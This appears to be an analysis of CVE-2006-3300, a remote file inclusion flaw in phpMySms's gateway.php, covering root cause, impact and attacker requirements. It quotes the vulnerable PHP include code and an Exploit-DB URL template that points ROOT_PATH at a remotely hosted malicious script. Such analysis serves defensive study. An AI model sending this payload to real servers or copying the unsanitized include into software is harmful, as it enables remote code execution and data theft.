Based on the provided information, here's a breakdown of the vulnerability:

**CVE ID:** CVE-2006-3300

**Root Cause:** The vulnerability lies in the `gateway.php` file of phpMySms v2.0 and earlier, where the `ROOT_PATH` variable is not properly sanitized. This allows for the inclusion of remote files via an HTTP GET request.

**Weaknesses/Vulnerabilities:**
*   **Remote File Inclusion (RFI):** The application directly includes a file path specified by the attacker via the `ROOT_PATH` GET parameter.

**Impact of Exploitation:**
*   **Arbitrary Code Execution:** By including a malicious script from a remote server, an attacker can execute arbitrary code on the server hosting the vulnerable application. This allows full control of the web server and potentially the entire system.
*   **Data compromise:** An attacker may gain access to sensitive data.

**Attack Vectors:**
*   **HTTP GET Request:** The attacker injects a URL to a malicious script into the `ROOT_PATH` parameter of a GET request to `gateway.php`.

**Required Attacker Capabilities/Position:**
*   The attacker needs to be able to send HTTP requests to the vulnerable application.
*  The attacker needs to host a malicious script on a server that is accessible to the vulnerable application.

**Technical Details from Exploit-DB:**

*   The vulnerable code snippet shows how the `config.php` file is included, either directly or using a potentially attacker-controlled `$ROOT_PATH` variable:
```php
if (($_POST[mode] == "1") or ($_GET[mode] == "1")) {
include ("config.php");
} else {
include ("$ROOT_PATH/config.php");
}
```
*   The exploit URL provided in the Exploit-DB entry is:
    `http://[site]/[sms location]/sms_config/gateway.php?ROOT_PATH=[evil_script]`
